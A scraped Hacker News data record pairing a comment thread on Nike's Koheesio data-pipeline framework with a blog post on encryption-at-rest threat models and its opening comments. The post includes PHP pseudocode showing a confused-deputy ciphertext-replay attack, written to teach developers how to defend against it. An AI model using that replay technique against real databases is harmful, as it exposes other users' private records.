by the linter before you submit a pull request. Testing: We use pytest for testing. Run the tests with make test and ensure all tests pass before submitting a pull request. Release Process: We aim for frequent releases. Typically when we have a new feature or bugfix, a developer with admin rights will create a new release on GitHub and publish the new version to PyPI. For more detailed information, please refer to our contribution guidelines. We also adhere to Nike's Code of Conduct and Nike's Individual Contributor License Agreement. Additional Resources General GitHub documentation GitHub pull request documentation Nike OSS",
    "commentLink": "https://news.ycombinator.com/item?id=40570892",
    "commentBody": "Koheesio: Nike's Python-based framework to build advanced data-pipelines (github.com/nike-inc)173 points by betacar 13 hours agohidepastfavorite52 comments newfocogi 3 hours agoI'd like to understand what data engineering inside Nike is actually like. I'm curious because I have relevant experience on my LinkedIn profile, and I get reached out to almost weekly from third party recruiters trying to fill really low paying contract data engineering and ML jobs with Nike. These roles seem to be targeting people with professional experience in the US but pay roughly a 3rd of what I would consider the going rate. There's another top level comment here that this tool might make sense \"in a shop with a lot of inexperienced devs\", which would confirm my anecdata. Maybe the roles are actually scams, who knows :shrug: reply hipadev23 2 hours agoparentNike's data engineering is very bad. It's hundreds of temporary contractors, mostly offshore, all with 6-18 month tenures, and everyone reinvents their own square wheel. Thousand upon thousands of abandoned confluence pages of documentation. The most convoluted SQL and data architecture you'll ever find. Getting answers to simple questions like \"How many shoes did we sell in-store vs ecommerce last week?\" is a nearly impossible task. reply steveBK123 2 hours agoparentprevMy experience with these kinds of tools (and I've built some myself) tells me that you're better off hiring people who know what they are doing or having enough experienced people PLUS culture to train up juniors. The idea that you'll just build a tool that makes hiring 10x as many inexperienced devs work is dubious. Just one more new DSL bro. Certainly we have cracked the code that no one else has. The problem with these types of orgs/tools is that by its nature your DSL constrains the juniors/inexperienced devs to what is currently possible. There is not a lot of learning unless you rotate them through the tools team periodically, which no one does. It's also awful for the devs who are building in experience in something they can't use anywhere else. I was in one shop where the \"tools team\" guys epiphany was he would meta-recruit by poaching the best data engineers out of the ETL team, lol. Very explicit \"good team / bad team\" vibes. reply alex_lav 1 hour agoparentprevSpeaking only my own experiences, my contract was ~2x what competitors were paying in the US. This was similar amongst the contractors I worked with, depending on seniority. reply waffletower 2 hours agoprevMany data engineering problems are impeded by strong typing, particularly type transduction applications (translating between a database type system and a transport such as Avro, for example). While in many cases that is somebody else's problem -- it is solved in a library -- when it isn't the strengths and facility of a dynamic language can save you considerable code complexity and maintenance. Type control is often central to reporting as well, and it is, again, more awkward in a strong typing context. I would tend to argue that insistence upon type frameworks such as pydantic in a data engineering framework is naive and imposed by academic rather than industry experience. There is a reason that python is chosen for data processing applications, and it certainly isn't typing. reply waffletower 2 hours agoparentGiving this some more thought: I do know that Nike has a revolving door for developers. It seems that a framework like Koheesio allows Nike to essentially hire for scala from a pool of candidates that only have python experience. Once hired, as they use pyspark and koheesio daily, they don't even know they are scala developers. Much easier to hire/fire python developers these days. reply IshKebab 1 hour agoparentprevPython is chosen for data processing because it's one of the most popular languages in the world and it has a passable REPL (which is more than most languages) so you can use it for experimentation. From the readme they describe it as \"robust\" and having a high level of type safety, so I'm guessing they're just leaning towards the \"learn about bugs up before they hit production\" end of the spectrum than you. Then again I don't do any of this data engineering stuff so maybe it doesn't matter too much if it doesn't work reliably? reply steveBK123 7 hours agoprevIf I had to guess, a tool like this might be useful in a shop with a lot of inexperienced devs. It's a thin wrapper to make sure everyone walks the same well worn path the same way. You have 2-3 devs work on the tooling, and a much larger team doing rote ETL. I worked at a shop that did this and the trade-off is TTM, as your 2 person tools team is constantly needing to unblock ETL team with new features as they encounter new requirements in the wild. If your ETL team is 20+ people and the tools team doesn't have a head start, tools team will quickly fall behind an insurmountable backlog as your ETL team spins its wheels. But you might save some money if you choose the right KPI.. reply haddr 6 hours agoparentI think this is the case: when you run your pipelines at scale you want to standardize and simplify some repeatable aspects to lower the cost of managing them. You may also want to be orthogonal to orchestrator engines (or triggering engines) and avoid getting too opinionated and inflexible in the future. So this framework is exploring some sweet spot between raw spark pipelines and low code etl engines. reply steveBK123 6 hours agorootparentyeah though a lot of these fall for a variant of the \"universal standard\" conceit joked about in xkcd. All these low-code solutions suck, so we'll build our own in-house that surely won't have the same pitfalls.. reply datavirtue 2 hours agoparentprevI built a data processing framework at GE that let junior devs write whatever code they needed to transform a particular input. It provided an interface that they had to satisfy (for data lineage metrics) but otherwise scaled their code without them having to understand the distributed architecture or anything about the platform. Exceptions flowed up to the platform and became part of the data lineage metrics. I walked into 20 years of adhoc code that had zero data lineage, recoverability, or scalability that was breaking daily. There were contractors with over a decade of tenure whose job it was to troubleshoot and fix their own brittle processes (and make new ones) daily. I got laid off (747Max plus pandemic) as I was rolling it out and they went back to the old way. Subsequently, a new startup (Pantomath) emerged with former GE engineers (and other former colleagues of mine) from my former department to address that problem domain. Based on my experience trying to socialize this type of solution, sales are going to be a bitch. reply steveBK123 2 hours agorootparentA framework with composable building blocks, allowing devs to unblock themselves by adding the functionality they need is a good solution. reply serial_dev 10 hours agoprevI used to work a little with ETLs, Spark, Storm, etc and I honestly don't understand the value proposition of this library. I'm no data engineer expert by any means (it was like 2 years working on data eng stuff about 30% of the time 5+ years ago), but I expected that at least I'd get what this is useful for. reply tiew9Vii 8 hours agoparentFrom their docs: > Koheesio is a Python library that simplifies the development of data engineering pipelines. It provides a structured way I think this pretty much sums it up, \"a structured way\". It's looks to be a thin wrapper around spark to provide a consistent way to structure ETL jobs. They've implemented a mini dsl defining jobs as a datastructure on top of Spark. I've seen several companies build stuff similar to this internally, defining jobs as a data structure. It all amounts to each company having their own internal conventions, their own view of what is easier for their devs and creating a framework for it. Nike have just decided to make theirs public. You can do all this simply with simple spark scripts. Personally I'd use simple spark scripts. Big companies with lots of people love making these tools as companies love conventions, their conventions, their style guides, deal with staff churn/on-boarding frequently so believe these kind of things make that easier. Probably makes sense in Nike as a way of organizing their ETL jobs but that looks to be all it brings. A way to structure/define your simple spark jobs the way Nike devs believe it should be done. reply anentropic 8 hours agoparentprevit looks like a layer of sugar over PySpark seems to be Spark-only AFAICT? reply ubercore 9 hours agoparentprevThis, at a glance, seems pretty simplistic. A neat project, but not something I would have expected on HN front page. reply whoiscroberts 5 hours agorootparentAfter decades of working on overly abstracted clever applications the only place I see elegance is in simplicity. I’d like to see more libraries like this on the front page. reply benterix 12 hours agoprevA probably better explanation of what it is and why you might want to use it (or not) can be found here: https://engineering.nike.com/koheesio/latest/tutorials/onboa... reply alessmar 6 hours agoprevA few weeks ago, I chose to write my data pipelines using Apache Beam. It seems that Koheesio shares some features with this project, but I believe Apache Beam is superior due to its ability to run on various runners, support multiple programming languages, and integrate with numerous data sources and destinations. reply esafak 1 hour agoparentIf I wanted an abstraction layer for writing pipelines today I'd look into ZenML: https://www.zenml.io/vs/zenml-vs-orchestrators reply tpoacher 5 hours agoprevOh so like luigi? Great! reply djaouen 3 hours agoprevSo this is like Broadway (Elixir), but for Python? reply esafak 13 hours agoprev> Koheesio is not in competition with other libraries. Yes, it is, because nobody wants to run multiple orchestrators, and the \"What sets Koheesio apart from other libraries?\" section does little to help users decide why they should pick yours. Workflow orchestration is a mature category, as evidenced by the length of this list: https://github.com/meirwah/awesome-workflow-engines I would expect someone who's seriously writing a new orchestrator in 2024 to cite the alternatives, their shortcomings, and how you intend to address them. Bonus points if you make a neat little table. The fact that you're leading with Python does not inspire confidence. Pretty much all workflow orchestrators use Python for their glue, and that's hardly the interesting part. What were they using at Nike before this? reply zaptheimpaler 12 hours agoparentThis is the kind of attitude that makes people, companies, researchers hesitant to publish code online. Its free code for everyone to see, they don't owe you anything. Its not necessarily a \"product\" for your consumption, its just a repo. reply koliber 9 hours agorootparentIt's a fair set of questions, posed fairly directly, without any sugarcoating. If you read it as a ruthless critique, it stings. If you read it as constructive feedback, it can bring the author a lot of value. If the author can clearly show the value proposition of their library, it will get more adoption, and the community and the author will get value. If the author realizes they coded something that is already a well-solved problem, or a poorly-constructed alternative, the author and Nike could gain by throwing this away and going with a better alternative. Personally, I wasted too many hours of my life creating a solution that did not solve any problems. Had I done some thinking and/or market research ahead of time, it would have saved me ton's of time to work on more worthwhile endeavors. Good feedback is worth its weight in gold, even if it hurts a bit to hear it. reply esafak 12 hours agorootparentprevI don't think so; this is a corporate project, not an enthusiast's. They probably had to internally justify building it over using an existing solution, so they could simply share their rationale. I am not trying to rain on their parade. reply fforflo 11 hours agorootparentIt's a library written by some devs who thought it might be useful to others, too, and/or are proud enough to share their work. It's not that they'll publish it in an SEC filing. For every n-th solution in the market, n-1 existing ones could have been used, but they weren't for (many times) good reasons. And looking at their Makefile and pyproject.toml I can see that they knew what they wanted. reply klohto 11 hours agorootparentyes, Nike is a corp where everyone sings kumbaya and the engineers have unlimited time to work on and publish libraries they are proud of, they don’t have to deliver specific values at all. reply blitzar 11 hours agorootparentthe kumbaya and coding is only allowed in the 5 minute lunchbreak at the nike sweatshops reply muspimerol 11 hours agorootparentprevI think this is a fair criticism. You chose to share this on hackernews, which invites feedback (including constructive criticism). I don't see the problem ¯\\_(ツ)_/¯ Do you expect people to only voice praise for open source projects? reply mb5 11 hours agorootparentWhy do you think the poster is connected with the repo? I couldn’t see any link. reply muspimerol 11 hours agorootparentI don't. Regardless who posted it, discussion and constructive criticism is warranted in the comments. reply yunohn 9 hours agorootparent/s Like it or hate it, it’s how social media works. Everyone posts other people’s things, and then more people get together to rip it to shreds. reply rockostrich 54 minutes agoparentprev> Workflow orchestration is a mature category As far as I can tell from the docs, this is not an orchestrator at all. It is a Python-wrapper for certain runtimes like PySpark. I don't see anything in the docs that mentions DAGs, dependency definitions, scheduling, or deployment. reply vincnetas 11 hours agoparentprevRegarding comments saying that parent comment lacks good faith, and code is free so take it as is, should also consider that parent has all the rights to express his concerns and opinions. If you don't like criticism or inconvenient questions, just skip it or ignore. For example parent insights were interesting to me. Good questions that i can learn from how critically evaluate things. reply serial_dev 10 hours agoparentprev> Workflow orchestration is a mature category, as evidenced by the length of this list (...) Or could it be an evidence that the existing tools all have their flaws and any reasonably sized organization will hit these flaws pretty early, so many orgs come to the conclusion that the best approach is to just roll their own that fits their case relatively well? reply thenaturalist 9 hours agorootparentAre you at all familiar with the data integration / ETL framework space? If so, I think you would recognize how unreasonable the presumption of your comment is. It certainly strikes me as such. Most if not all the big OSS frameworks and commercial offerings originated in one big corp and subsequently moved into the Apache direction (Airflow) or spun out into their own companies. reply whimsicalism 3 hours agorootparentprevno offense, but you clearly don’t know much about orchestrators reply gonzo41 9 hours agoparentprevEvery task orchestration tool kinda has a crappy security model. Sure they're a ton of them but when you start putting it all over the place it's just a hectic to get right. That is a feel the space someone could make gains in a big way. reply whimsicalism 3 hours agoparentprevyeah they need to explain why this is better than flyte reply boffinAudio 11 hours agoparentprev>nobody wants to run multiple orchestrators Straw man argument. >I would expect someone who's seriously writing a new orchestrator in 2024 to cite the alternatives, their shortcomings, and how you intend to address them. Bonus points if you make a neat little table. Did you even try to read the docs before you launched this critical diatribe? From the docs (https://engineering.nike.com/koheesio/latest/tutorials/onboa...): Advantages of Koheesio Using Koheesio instead of raw Spark has several advantages: Modularity: Each step in the pipeline (reading, transformation, writing) is encapsulated in its own class, making the code easier to understand and maintain. Reusability: Steps can be reused across different tasks, reducing code duplication. Testability: Each step can be tested independently, making it easier to write unit tests. Flexibility: The behavior of a task can be customized using a Context class. Consistency: Koheesio enforces a consistent structure for data processing tasks, making it easier for new developers to understand the codebase. Error Handling: Koheesio provides a consistent way to handle errors and exceptions in data processing tasks. Logging: Koheesio provides a consistent way to log information and errors in data processing tasks. In contrast, using the plain PySpark API for transformations can lead to more verbose and less structured code, which can be harder to understand, maintain, and test. It also doesn't provide the same level of error handling, logging, and flexibility as the Koheesio Transform class. It took me less than 15 seconds to find the solution to the problem you propose. How long did it take you to formulate your critique? Do you perhaps just have a prejudice against Nike (corporate haze), or is it an investment in a 'competing orchestrator' that is clouding your judgement? reply esafak 10 hours agorootparentEvery modern workflow orchestrator does those things you quote, and more. You make it sound like they're innovations when they're table stakes. Why wouldn't you just use Flyte or Kubeflow? Also, the fact that they say that the alternative is \"raw Spark\" tells me either that they're confused, or not very good at explaining. Spark is used to execute tasks in a pipeline, not to orchestrate it. reply thenaturalist 9 hours agorootparentWhile I generally tend to agree with your basic criticism, I think you need to keep in mind our perspectives might be biased due to limited data. Flyte went OSS what, 4 years ago? I'm not super familiar with it, but a) could have been that it was too unpolished at the time or b) requiring K8s to be a non-starter for some teams/ orgs. Same for Kubeflow. We also don't know for how long Koheesio existed within Nike. In short, there's a lot we don't know and there's a good chance the internal reasoning for investing in this made sense under certain circumstances in the past. reply esafak 2 hours agorootparentThis project is two weeks old! reply bt1a 11 hours agoparentprevI'll agree that the pages about Koheesio hosted on nike's website are strangely empty of persuasive specifics (seems like generative AI used by someone who was in charge of writing it up lol..), but maybe the authors believe that someone who's seriously considering a data pipeline library would want to look at the actual code (which by the way, is structured quite well). Python doesn't \"inspire confidence\"? Think of the target audience. The frameworks claims to take typing and tests quite seriously, so perhaps your confidence is gained elsewhere. I didn't go through the codebase because I'm not interested, but your dismissive attitude doesn't radiate good faith reply adrianbr 9 hours agoprevThat's really cool, did you already saw the dlt library? That one's done for very easy to use EL in python. It's similarly modular and built by senior data engineers for the data team, and the sources are generators which you could probably use too. How is koheesio different to dlt? Where could they complement each other? reply hipadev23 12 hours agoprevnext [5 more] Had Nike as a client for a period of time, interacted with quite a few people across their data org. There is absolutely no software you want authored by them. reply teekert 8 hours agoparentI worked at a large Healthtech company before. I get the sentiment. But, in the forest of software based on poor decisions, there were definitely a couple of valuable gems made by very knowledgeable people. Generally those were the people with an \"opensource mindset\" (as opposed to the \"my ultra-crappy code that is just some FOSS glued together is super valuable IP and you need to read 100s of QMS docs before you can lay your eyes on it\"-people). Don't measure the whole org by the same yardstick. reply annexrichmond 12 hours agoparentprevThis is just flat out rude. reply sam_lowry_ 12 hours agorootparentIt's a big organization, but I can understand the feeling, because I had the same attitude towards Microsoft, Oracle, Salesforce and many others. reply alex_lav 11 hours agorootparentIt’s a big organization, which means there will be areas full of great people and areas full of less-than great people. To discount all work from a group that large is just silly. reply jiggunjer 13 hours agoprev [–] Another snakemake? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Koheesio is a Python framework aimed at building efficient, modular data pipelines, enhancing collaboration and reusability.",
      "It integrates with various data processing libraries, supports type safety and structured configurations using Pydantic, and includes components like Steps, Context, and Logger.",
      "Koheesio supports PySpark for tasks such as ETL (Extract, Transform, Load), data validation, and large-scale processing, and can be installed via pip, Hatch, or Poetry."
    ],
    "commentSummary": [
      "Nike has developed a Python-based framework named Koheesio for constructing advanced data pipelines, addressing internal data engineering challenges such as reliance on temporary contractors, convoluted SQL, and poor documentation.",
      "Opinions on Koheesio are mixed; some view it as beneficial for less experienced developers, while others criticize it for not promoting proper learning, with comparisons made to tools like Apache Beam and Luigi.",
      "Despite skepticism, Koheesio is appreciated by some for its structured approach to error handling and logging, highlighting the variability in software quality within large organizations based on individual contributors."
    ],
    "points": 173,
    "commentCount": 52,
    "retryCount": 0,
    "time": 1717477677
  },
  {
    "id": 40573211,
    "title": "Understanding Encryption at Rest: Key Threat Models and Best Practices",
    "originLink": "https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/",
    "originBody": "Encryption At Rest: Whose Threat Model Is It Anyway? June 2nd, 2024 Head’s up: This is a blog post about applied cryptography, with a focus on web and cloud applications that encrypt data at rest in a database or filesystem. While the lessons can be broadly applicable, the scope of the post is not. One of the lessons I learned during my time at AWS Cryptography (and particularly as an AWS Crypto Bar Raiser) is that the threat model for Encryption At Rest is often undefined. Prior to consulting cryptography experts, most software developers do not have a clear and concise understanding of the risks they’re facing, let alone how or why the encrypting data at rest would help protect their customers. Unsurprisingly, I’ve heard a few infosec thought leader types insist that encryption-at-rest is security theater over the years. I disagree with this assessment in the absolute terms, but there is a nugget of truth in that assertion. The million dollar question. Let’s explore this subject in a little more detail. Why should we listen to you about this topic? (If you don’t need any convincing, feel free to skip this section.) Encryption at rest is a particular hobby horse of mine. I previously wrote on this blog about the under-celebrated design decisions in the AWS Database Encryption SDK and the need for key-committing AEAD modes in multi-tenant data lakes. Before my time at Amazon, I had also designed a PHP library called CipherSweet that offers a limited type of Searchable Encryption. The goal of CipherSweet was to improve the cryptography used by SuiteCRM. (The library name is, of course, a pun.) I’ve also contributed a ton of time making cryptography easy-to-use and hard to misuse outside of the narrow use-case that is at-rest data encryption. To that end, I designed PASETO as a secure-by-default alternative to JSON Web Tokens. I also have a lot of skin in the game when it comes to developer comprehension: I was the first Stack Overflow user with a gold badge for both [security] and [encryption], largely due to the effort I put into cleaning up the bad cryptography advice for the PHP ecosystem. I have spent the past decade or so trying to help teams avoid security disasters in one form or another. Why should we not listen to you about this topic? If you happen to know a cryptography expert you trust more than some Internet stranger with a blog, I implore you to listen to them if we disagree on any point. They may know something I don’t. (That said, I’m always happy to learn something new!) I also do not have a college degree in Cryptography, nor have I published any papers in prestigious academic journals. If you care very much about this sort of pedigree, you will likely find my words easily discarded. If this describes your situation, no hard feelings. Why and How to use Encryption At Rest to Protect Sensitive Data Important: I’m chiefly interested in discussing one use-case, and not focusing on other use cases. Namely, I’m focusing on encryption-at-rest in the narrow context of web applications and/or cloud services. This is not a comprehensive blog post covering every possible use case or threat model relating to encryption at rest. Those other use cases are certainly interesting, but this post is already long enough with a narrower focus. In particular: I’m not talking about the threats faced by activists or whistleblowers. This is a software engineering and applied cryptography focused blog post. If you’re only interested in compliance requirements, you can probably just enable Full Disk Encryption and call it a day. Then, if your server’s hard drive grows legs and walks out of the data center, your users’ most sensitive data will remain confidential. Unfortunately, for the server-side encryption at rest use case, that’s basically all that Disk Encryption protects against. If your application or database software is online and an attacker gains access to it (e.g., through SQL injection), with full disk encryption, it might as well be plaintext to an online attacker. It do be like that. Therefore, if you find yourself reaching for Encryption At Rest to mitigate the impact of the kind of vulnerability that would leak the contents of your database or filesystem to an attacker, you’re probably unwittingly engaging in security theater. Disk Encryption is important for disk disposal and mitigating hardware theft, not preventing data leakage to online attackers. So the next logical thing to do is draw a box around the system or component that stores a lot of data and never let plaintext cross that boundary. Client-Side Encryption Note: The naming here is a little imprecise. It is client-side encryption with respect to your data warehouse (i.e. SQL database), but not with respect to the user experience of a web application. In those cases, client-side would mean on the actual end user’s device. Instead, client-side encryption is the generic buzz-word to mean that you’re encrypting data outside of the box you drew in your system architecture. Generally, this means that you have an application server that’s acting as the “client” for the purpose of bulk data encryption. There are a lot of software projects that aim to provide client-side encryption for data stored in a database or filesystems; e.g., in Amazon S3 buckets. This is a step in the right direction, but implementation details matter a lot. Quick aside: For the remainder of this blog post, I’m going to assume an architecture that looks like a traditional web application, for simplicity. The assumed architecture looks vaguely like this: User Agents (e.g., web browsers) that communicate with the application server. Application Server(s) respond to HTTP requests from user agents, manages key material using KMS, encrypts / decrypts records stored in the database. Database Server(s) which store ciphertext on behalf of the application server. This is an abstract design, so the actual implementation details you encounter in the real world may be simpler or more complex in different respects. There are other interesting design considerations for OS-level end-user device encryption that I’m not going to explore today. For example: Adiantum is extremely cool. I’m also not going to dive deep into laptop theft or the importance of Full Disk Encryption as a mechanism for ensuring data is erased from solid state hard drives, or the activities of hostile nation states. That’s a separate discussion entirely. Security Considerations for Client-Side Encryption The first question to answer when data is being encrypted is, “How are the keys being managed?” This is a very deep rabbit hole of complexity, but one good answer for a centralized service is, “Cloud-based key management service with audit logging”; i.e. AWS KMS, Google CloudKMS, etc. We could talk about key management for a very long time, but there’s other things I want to focus on, so let’s revisit that in a future blog post. Next, you have to understand how the data is being encrypted in the first place. Bad answer: AES in CBC mode without HMAC. Worse answer: AES in ECB mode. Generally, you’re going to want to use an AEAD construction, such as AES-GCM or XChaCha20-Poly1305. You’ll also want key-commitment if you’re storing data for multiple customers in the same hardware. You can get this property by stapling HKDF onto your protocol (once for key derivation, again for commitment). See also: PASETO v3 and v4, or Version 2 of the AWS Encryption SDK. It may be tempting to build a committing AEAD scheme out of, e.g., AES-CTR and HMAC, but take care that you don’t introduce canonicalization risks in your MAC. Is Your Deputy Confused? Even if you’re using IND-CCA secure encryption and managing your keys securely, there is still a very stupid attack against many data-at-rest encryption schemes. To understand the attack, first consider this sort of scenario: Alice and Bob use the same health insurance provider, whom is storing sensitive medical records for both parties. Bob works as a database administrator for the insurance company he and Alice both use. One day, he decides to snoop on her private medical history. Fortunately, the data is encrypted at the web application, so all of the data Bob can access is indistinguishable from random. He can access his own account and see his data through the application, but he cannot see Alice’s data from his vantage point on the database server. Here’s the stupid simple attack that works in far too many cases: Bob copies Alice’s encrypted data, and overwrites his records in the database, then accesses the insurance provider’s web app. Bam! Alice’s plaintext recovered. What’s happening here is simple: The web application has the ability to decrypt different records encrypted with different keys. If you pass records that were encrypted for Alice to the application to decrypt it for Bob, and you’re not authenticating your access patterns, Bob can read Alice’s data by performing this attack. The cryptographic attack is literally copy and paste, from the database administrator’s perspective. It’s stupid but it works against too many encryption-at-rest software projects. In this setup, the application is the Deputy, and you can easily confuse it by replaying an encrypted blob in the incorrect context. The mitigation is simple: Use the AAD mechanism (part of the standard AEAD interface) to bind a ciphertext to its context. This can be a customer ID, each row’s value for the primary key of the database table, or something else entirely. If you’re using AWS KMS, you can also use Encryption Context for this exact purpose. An Illustrative Example Let’s say you have a simple web application that encrypts data before storing it in a SQL database. Let’s also write it to use AES-GCM, since unauthenticated CBC mode is awful. A quick and dirty implementation might look like this: class User { public function __construct( public readonly string $username, public string $email, public string $fullName ) {} } class UserModel { public function __construct(protected Database $db) {} public function save(User $user): bool { return $this->db->upsert( 'users', [ // set 'full_name' => aes128gcm_encrypt($user->fullName), 'email' => aes128gcm_encrypt($user->email) // encryption details abstracted ], [ // where 'username' => $user->username ] ); } public function fetch(string $username): User { $row = $this->db->fetch('users', ['username' => $username]); return new User( $username, aes128gcm_decrypt($row['email']), aes128gcm_decrypt($row['full_name']) ); } } For the abstracted aes128gcm functions in the pseudocode above, just assume they’re getting the key from KMS during encryption and storing an encrypted data key in a place the ciphertext can reference later on decrypt. I didn’t want to complicate the pseudocode with a lot of boilerplate. You might decide to prove the confused deputy risk by doing something like this: $model = new UserModel($db); $model->save(new User('alice', 'alice@example.com', 'Alice McWonderland')); $model->save(new User('bob', 'bob@example.com', 'Bob BurgerMeister')); // Fetch Alice's data $aliceData = $db->fetch('users', ['username' => 'alice']); $bobData = $db->fetch('users', ['username' => 'bob']); // This is the attack the database server can perfrom: // Replace Bob's full_name with Alice's email $db->upsert('users', [ 'full_name' => $alice['email'] ], ['username' => 'bob']); $badBob = $model->fetch('bob'); Now Bob’s full name is set to Alice’s email address. The Curious Case of CipherSweet My knowledge of this risk didn’t manifest itself in a vacuum. It was discovered over the years of maintaining an open source library. The first release of CipherSweet mitigated most of this risk by construction: Each field uses a different encryption key, through a key derivation scheme. In pseudocode: def encryptRow(self, records): for field, type in self.fieldsToEncrypt: key = self.getFieldSymmetricKey(self.table, field) records[field] = encryptField(key, field) Since CipherSweet’s inception, if you try to replace Alice’s encrypted zip code with Alice’s encrypted social security number, the keys would be wrong, so it would lead to a decryption failure. Or so I thought! As I mentioned in my blog post about multi-tenancy and confused deputy attacks, if your AEAD mode doesn’t commit to the key used, it’s possible to craft a single (ciphertext, tag) that decrypts to two different plaintext values under two different keys. CipherSweet’s ModernCrypto suite used XChaCha20-Poly1305, which is not key-committing, and therefore susceptible to this sort of misuse. This violated the Principle of Least Astonishment and motivated the development of a new algorithm suite called BoringCrypto, which used BLAKE2b-MAC instead of Poly1305. This change was released in version 3.0.0 in June 2021. However, even with BoringCrypto in 3.0.0, this only mitigated most of the issue by construction. The last mile of complexity here is that each field must also be bound to a primary key or foreign key. Encrypting with AAD has been possible since a very early release of CipherSweet, but being possible to use securely is not sufficient. It should be easy to use securely. CipherSweet Version 4.7.0, which was released last month, now only requires a code change that looks like this in order to mitigate confused deputies in an application: $multiRowEncryptor = new EncryptedMultiRows($engine); $multiRowEncryptor + ->setAutoBindContext(true) + ->setPrimaryKeyColumn('table2', 'id') ->addTextField('table1', 'field1') This is in addition to the new Enhanced AAD feature, which allows for flexible and powerful context binding based on other fields and/or string literals. (In fact, this new convenience feature actually uses Enhanced AAD under-the-hood.) This doesn’t come for free, however: Users have to know the serial / primary key for a record prior to writing it, in order to use it as AAD when encrypting fields. However, that’s a much easier pill to swallow than expecting PHP devs to manage the complexity of context-binding themselves. As you can see, mitigating confused deputies in an encryption library (without making it unwieldy) requires a painstaking attention to detail to get right. As Avi Douglen says, “Security at the cost of usability comes at the cost of security.” Given the prevalence of client-side encryption projects that just phone it in with insecure block cipher modes (or ECB, which is the absence of a block cipher mode entirely), it’s highly doubtful that most of them will ever address confused deputy attacks. Even I didn’t get it right at first when I made CipherSweet back in 2018. What about non-databases? Everything I mentioned in the previous section was focused on confused deputy attacks against client-side encryption for information that is stored in a database, but it’s a general problem with encrypting data at rest and storing the ciphertext “server-side”. If you’re storing encrypted data in an S3 bucket, rather than in MySQL, you still need some form of context-binding mechanism to prevent the dumb and obvious attack from working against a deputy that reads data from said S3 bucket. If you take nothing else away from this blog post, remember: Authenticate your access patterns. Why aren’t things better already? As with most things in software security, the problem is either not widely known, or is not widely understood. Unknown unknowns tend to fester, untreated, across the entire ecosystem. Misunderstood issues often lead to an incorrect solution. In this case, at-rest encryption is mostly in Column B, and confused deputy attacks are mostly in Column A. The most pronounced consequence of this is, when tasked with building at-rest data encryption in an application, most software developers do not have a cohesive threat model in mind (let alone a formal one). This leads to disagreement between stakeholders about what the security requirements actually are. How can I help improve things somewhat? Most importantly, spread awareness of the nuances of encryption at-rest. This blog post is intended to be a good conversation starter, but there are other resources to consider, too. I’ve linked to many of them throughout this post already. If you’re paying for software to encrypt data at rest, ask your vendor how they mitigate the risk of confused deputy attacks. Link them to this blog post if they’re not sure what you mean. If said vendor responds, “this risk is outside of our threat model,” ask to see their formal threat model document. If it exists and doesn’t align with your application’s threat model, maybe consider alternative solutions that provide protection against more attack classes than Full Disk Encryption would. Finally, gaining experience with threat modeling is a good use of every developer’s time. Adam Caudill has an excellent introductory blog post on the subject. Closing Thoughts Despite everything I’ve written here today, I do not claim to have all the answers for encryption at rest. However, you can unlock a lot of value just by asking the right questions. My hope is that anyone that reads this post is now capable of asking those questions. Addendum (2024-06-03) After I published this, the r/netsec subreddit has expressed disappointment that this blog post had “no mention of” consumer device theft or countries experiencing civil unrest and pulling hard drives from data centers. You could make a congruent complaint that it also had no mention of Batman. To be clear, I’m not saying that the use cases and risks Reddit cares about are off-topic to any discussion of full-disk encryption. They matter. Rather, it’s that they’re not relevant to the specific point I am making: Even in the simplest use case, far from the annoying details of end user hardware or the whims of nation states, encryption-at-rest is poorly understood by most developers, and should be thought through carefully. Your threat model is not my threat model, and vice versa. I never advertised this blog post as a comprehensive and complete guide to the entire subject of encryption-at-rest. If you too felt under-served by this blog post for not addressing the corner cases that really matter to you, I hope this addendum makes it clearer why I didn’t cover them. Finally, if you feel that there’s an aspect of the encryption-at-rest topic that really warrants further examination, I invite you to blog about it. If your blog post is interesting enough, I’ll revise this post and link to it here. Share this: Twitter Facebook Like Loading… June 2, 2024 Scott Arciszewski Cryptography Cryptography, cybersecurity, encryption, encryption-at-rest, security, symmetric cryptography, technology Appreciate My Writing? If you found any of my writing helpful, useful, or insightful, consider buying me a coffee through Ko-Fi. Leave a comment",
    "commentLink": "https://news.ycombinator.com/item?id=40573211",
    "commentBody": "Encryption at Rest: Whose Threat Model Is It Anyway? (scottarc.blog)171 points by chillax 7 hours agohidepastfavorite131 comments rsync 1 hour agoI've read the article and the entire comment thread and nobody is talking about the cloud provider itself ... ? When someone borgs[1] up their data to store at rsync.net we just assume that we are the threat. Of course I don't believe that but it's perfectly rational and we encourage people to think of rsync.net as a threat as they design their backups. Comments in this thread are actually discounting the threat of Amazon personnel, GCS personnel, etc., as if that threat was zero. Not only is it non-zero, I would go further: if you're storing the data on AWS and generating your keys on AWS and managing your keys with AWS ... you're doing it wrong. [1] https://www.borgbackup.org/ reply CiPHPerCoder 1 hour agoparentThis is an interesting and important point that you raised. > if you're storing the data on AWS and generating your keys on AWS and managing your keys with AWS ... you're doing it wrong. This is a reasonable thing to do if you've decided that you trust AWS and expect any violations of this trust to be dealt with by the legal department. It's less reasonable if you're concerned about AWS employees going rogue and somehow breaking the security of KMS without anyone else knowing. It's even less reasonable to do this if you're concerned about AWS credentials being leaked or compromised, which in turn grants an attacker access to KMS (i.e., a government would be more successful by compelling IAM to grant access than they would trying to subpoena KMS for raw keys). (Sure, you can audit access via CloudTrail, but that's a forensics tool, not a prevention tool.) But that's kind of the point I wrote in the article, no? You need to know your threat model. You've stated yours succinctly, and I think it's a commendable one, but many enterprises are a bit more relaxed. reply jcrites 1 hour agoparentprevThat's workable for many situations which only require data \"storage\", but the moment when you require cloud-side data \"processing\" too, the situation changes. I would agree that if you have no use-case for cloud-side data processing, then the cloud doesn't need the encryption keys; however there are a lot of use-cases for data for which processing is highly advantageous. For example, if you just want to store data in the cloud, sure, use client-side encryption. But what if you want to query it with, using an S3 example, S3 Select or Athena or load it into a data lake? There are a lot of things one might do. It's useful to be able to query data from within the cloud – without having to transfer it out and separately decrypt it. This use-case is likely one of the primary reasons why customers are willing to trust cloud providers to manage the keys too – for many data sets, though not all. And that's what technologies like cloud KMS are good for. Access to the actual keys is tightly limited within the cloud provider, both among employees and technologically, and not even other cloud services are capable of accessing them (either accessing the keys or encrypting/decrypting using them) unless you grant them explicit permission, with internal technology that enforces this. Maybe you didn't intend on using \"new fancy foo service\" to process your stored data yesterday, but today it sounds good, so you can alter an access control grant and allow it to interact with your existing stored data and the necessary encryption keys. Maybe every time some new data arrives in S3, you want to process that data with Lambda and synchronize it with another system. Then it's helpful if you can 